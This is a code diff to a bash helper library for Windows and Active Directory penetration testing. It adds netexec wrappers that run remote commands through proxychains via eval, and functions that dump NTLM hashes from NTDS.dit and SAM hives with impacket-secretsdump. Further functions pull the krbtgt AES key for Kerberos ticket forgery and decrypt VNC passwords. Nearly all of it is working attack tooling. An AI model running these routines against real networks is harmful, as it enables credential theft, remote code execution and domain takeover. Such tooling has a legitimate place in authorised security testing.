@@ -172,8 +172,12 @@ run_netexec() {
         password="passwords.txt"
         if [[ ! -f "$password" ]]; then
             echo "Password file $password not found. Assuming you wanted blank password"
-            password="''"
+            password=""
         fi
+    fi
+    if [[ ! -z "$domain" ]]; then
+        netexec_additional_options+=" -d $domain"
+        echo "Using domain $domain"
     fi
     if [[ ! -z "$password" ]]; then
         netexec_password_options="-p $password"
@@ -187,9 +191,14 @@ run_netexec() {
     if [[ ! -z "$use_proxychain" ]] && [[ "$use_proxychain" == "true" ]]; then
         proxychain_command="proxychains -q "
         echo "Running netexec with proxychains"
-    fi    
-    echo ${proxychain_command}netexec $netexec_protocol $target_ip $netexec_user_options $netexec_password_options $netexec_additional_options
-    ${proxychain_command}netexec $netexec_protocol $target_ip $netexec_user_options $netexec_password_options $netexec_additional_options
+    fi
+    if [[ ! -z $run_cmd ]] && [[ "$run_cmd" == "true" ]]; then
+        netexec_additional_options+=" -X \"$cmd\""
+    fi
+    eval_string="${proxychain_command}netexec $netexec_protocol $target_ip $netexec_user_options $netexec_password_options $netexec_additional_options"
+    echo "$eval_string"
+    eval "$eval_string"
+    #eval ${proxychain_command}netexec $netexec_protocol $target_ip $netexec_user_options $netexec_password_options $netexec_additional_options
 }
 
 trim_rockyou() {
@@ -218,7 +227,56 @@ run_keepassxc_cli_command () {
     echo $kdbx_password | keepassxc-cli $1 $kdbx_file "$2"
 }
 
-get_hashes_from_secrets_dump() {
+get_ntlm_hashes_from_ntds() {
+    if [[ -z $target_username ]]; then
+        echo "No target username provided"
+        return 1
+    fi
+    local secrets_dump_options=""
+    if [[ -z $target_system ]]; then
+        target_system=system.hive
+        echo "No target SYSTEM provided, using default $target_system"
+    fi
+    if [[ ! -f "$target_system" ]]; then
+        echo "No target SYSTEM provided and default $target_system not found, cannot get hashes from secretsdump."
+        return 1
+    fi
+    secrets_dump_options+=" -system $target_system"
+    if [[ -z $target_ntds ]]; then
+        target_ntds=ntds.dit
+        echo "No target NTDS provided, using default $target_ntds"
+    fi
+    if [[ ! -f "$target_ntds" ]]; then
+        echo "No target NTDS provided and default $target_ntds not found, cannot get hashes from secretsdump."
+        return 1
+    fi
+    secrets_dump_options+=" -ntds $target_ntds"
+    if [[ -z "$dump_file_base" ]]; then
+        dump_file_base=hashes.secretsdump
+    fi
+    local dump_file="$dump_file_base.ntds"
+    echo "Using secrets dump file $dump_file"
+    if [[ ! -f "$dump_file" ]]; then
+        echo "Secrets dump file $dump_file not found, creating it..."
+        impacket-secretsdump $secrets_dump_options LOCAL -outputfile $dump_file_base
+    fi
+    if [[ -z "$target_domain" ]]; then
+        hash_file=$dump_file_base.$target_username
+    else
+        hash_file=$dump_file_base.$target_domain.$target_username
+    fi
+    ntlm_hash=$(cat "$dump_file" | grep $target_username | head -n 1 | awk -F':' '{print $4}')
+    if [[ -z $ntlm_hash ]]; then
+        echo "No NTLM hash found for $target_username"
+        return 1
+    fi
+    echo $ntlm_hash > $hash_file
+
+}
+
+
+get_ntlm_hashes_from_sam_hives() {
+
     if [[ ! -z "$1" ]]; then
         target_username="$1"
     fi
@@ -226,35 +284,101 @@ get_hashes_from_secrets_dump() {
         echo "No target username provided"
         return 1
     fi
+    local secrets_dump_options=""
     if [[ -z $target_sam ]]; then
         target_sam=sam.hive
-        if [[ ! -f "$target_sam" ]]; then
-            echo "No target SAM provided and default $target_sam not found, cannot get hashes from secretsdump."
-            return 1
-        fi
-        echo "No target SAM provided, using default $target_sam"        
+        echo "No target SAM provided, using default $target_sam"
     fi
+    if [[ ! -f "$target_sam" ]]; then
+        echo "No target SAM provided and default $target_sam not found, cannot get hashes from secretsdump."
+        return 1
+    fi    
+    secrets_dump_options="-sam $target_sam"
     if [[ -z $target_system ]]; then
         target_system=system.hive
-        if [[ ! -f "$target_system" ]]; then
-            echo "No target SYSTEM provided and default $target_system not found, cannot get hashes from secretsdump."
-            return 1
-        fi
         echo "No target SYSTEM provided, using default $target_system"
+    fi
+    if [[ ! -f "$target_system" ]]; then
+        echo "No target SYSTEM provided and default $target_system not found, cannot get hashes from secretsdump."
+        return 1
+    fi
+    secrets_dump_options+=" -system $target_system"
+    if [[ ! -z $target_security ]]; then
+        if [[ -f "$target_security" ]]; then
+            secrets_dump_options+=" -security $target_security"
+        fi
+    fi
+    if [[ -z "$dump_file_base" ]]; then
+        dump_file_base=hashes.secretsdump
+    fi
+    local dump_file="$dump_file_base.sam"
+    if [[ ! -f "$dump_file" ]]; then
+        echo "Secrets dump file $dump_file not found, creating it..."
+        impacket-secretsdump $secrets_dump_options LOCAL -outputfile $dump_file_base
     fi
     #replace the hashfile
     if [[ -z "$target_domain" ]]; then
-        hash_file=hashes.$target_username
+        hash_file=$dump_file_base.$target_username
     else
-        hash_file=hashes.$target_domain.$target_username
+        hash_file=$dump_file_base.$target_domain.$target_username
     fi
-    ntlm_hash=$(secretsdump.py -sam $target_sam -system $target_system LOCAL | grep $target_username | awk -F':' '{print $4}')
+    ntlm_hash=$(cat "$dump_file" | grep $target_username | awk -F':' '{print $4}')
     if [[ -z $ntlm_hash ]]; then
         echo "No NTLM hash found for $target_username"
         return 1
     fi
     echo $ntlm_hash > $hash_file
 
+}
+
+get_ntlm_hash_from_secretsdump() {
+    if [[ -z $dump_file ]]; then
+        echo "No full dump file provided"
+        return 1
+    fi
+    if [[ -z $target_username ]]; then
+        echo "No target username provided"
+        return 1
+    fi
+    ntlm_hash=$(cat "$dump_file" | grep $target_username | awk -F':' '{print $4}')
+    if [[ -z $ntlm_hash ]]; then
+        echo "No NTLM hash found for $target_username"
+        return 1
+    fi
+    hash_file=$dump_file.$target_username
+    echo $ntlm_hash > $hash_file
+
+}
+
+get_aes_key_from_secretsdump() {
+    if [[ -z $dump_file ]]; then
+        echo "No full dump file provided"
+        return 1
+    fi
+    if [[ -z $target_username ]]; then
+        echo "No target username provided"
+        return 1
+    fi
+    if [[ $target_username != "krbtgt" ]]; then
+        echo "Warning: for ticket forgery, we normally use krbtgt user. You are using $target_username"
+    fi
+    aes_key=$(cat "$dump_file" | grep $target_username | head -n 1 | awk -F':' '{print $3}')
+    if [[ -z $aes_key ]]; then
+        echo "No AES key found for $target_username"
+        return 1
+    fi
+    hash_file=$dump_file.$target_username
+    echo "AES key for $target_username is $aes_key"
+    echo $aes_key > $hash_file
+}
+
+decrypt_vnc_password() {
+    if [[ -z $1 ]]; then
+        echo "Usage: $0 <encrypted_hex>"
+        exit 1
+    fi
+    local encrypted_hex=$1
+    perl $SCRIPTDIR/../perl/vnc_decrypt.pl "$encrypted_hex"
 }
 
 if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
